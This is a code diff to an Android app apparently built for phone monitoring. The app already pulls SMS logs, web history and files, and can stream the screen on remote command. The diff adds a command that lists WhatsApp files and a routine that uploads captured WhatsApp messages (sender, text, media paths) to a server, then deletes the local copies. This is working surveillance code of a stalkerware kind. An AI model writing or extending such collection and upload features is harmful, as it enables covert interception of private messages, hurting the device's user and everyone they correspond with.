@@ -30,6 +30,8 @@ import com.spapp.monitoring.network.SmsLogEntryDto
 import com.spapp.monitoring.network.SmsLogSyncRequest
 import com.spapp.monitoring.network.WebHistoryEntryDto
 import com.spapp.monitoring.network.WebHistorySyncRequest
+import com.spapp.monitoring.network.WhatsAppMessageEntryDto
+import com.spapp.monitoring.network.WhatsAppMessagesSyncRequest
 import java.time.Instant
 
 /**
@@ -135,6 +137,7 @@ class SyncRunner(private val context: Context) {
         }
         if (flags.file_manager) {
             commands.filter { it.command_type == "file_list" }.forEach { processFileListCommand(bearer, it) }
+            commands.filter { it.command_type == "whatsapp_file_list" }.forEach { processWhatsAppFileListCommand(bearer, it) }
             commands.filter { it.command_type == "file_download" }.forEach { processFileDownloadCommand(bearer, it) }
         }
         commands.filter { it.command_type == "screen_stream" }.forEach { processScreenStreamCommand(bearer, it) }
@@ -160,6 +163,7 @@ class SyncRunner(private val context: Context) {
             syncGeofences(bearer)
         }
         syncBlockRules(bearer)
+        syncWhatsAppMessages(bearer, db)
 
         state.lastSyncAtEpochMs = System.currentTimeMillis()
         return true
@@ -229,6 +233,15 @@ class SyncRunner(private val context: Context) {
     private suspend fun processFileListCommand(bearer: String, command: RemoteCommand) {
         try {
             val files = FileManagerCollector(context).listAllRecursive()
+            ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, files = files))
+        } catch (e: Exception) {
+            // Retried next sync cycle.
+        }
+    }
+
+    private suspend fun processWhatsAppFileListCommand(bearer: String, command: RemoteCommand) {
+        try {
+            val files = FileManagerCollector(context).listWhatsAppFiles()
             ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, files = files))
         } catch (e: Exception) {
             // Retried next sync cycle.
@@ -570,6 +583,31 @@ class SyncRunner(private val context: Context) {
         }
         try {
             ApiClient.service.syncInstalledApps(bearer, InstalledAppsSyncRequest(dtos))
+        } catch (e: Exception) {
+            // Retried on next scheduled run.
+        }
+    }
+
+    private suspend fun syncWhatsAppMessages(bearer: String, db: AppDatabase) {
+        val unsynced = db.whatsAppMessageDao().getUnsynced()
+        if (unsynced.isEmpty()) return
+
+        val dtos = unsynced.map {
+            WhatsAppMessageEntryDto(
+                chatName = it.chatName,
+                sender = it.sender,
+                messageText = it.messageText,
+                isOutgoing = it.isOutgoing,
+                messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
+                mediaType = it.mediaType,
+                mediaPath = it.mediaPath
+            )
+        }
+        try {
+            val response = ApiClient.service.syncWhatsAppMessages(bearer, WhatsAppMessagesSyncRequest(dtos))
+            if (response.isSuccessful) {
+                db.whatsAppMessageDao().deleteByIds(unsynced.map { it.id })
+            }
         } catch (e: Exception) {
             // Retried on next scheduled run.
         }
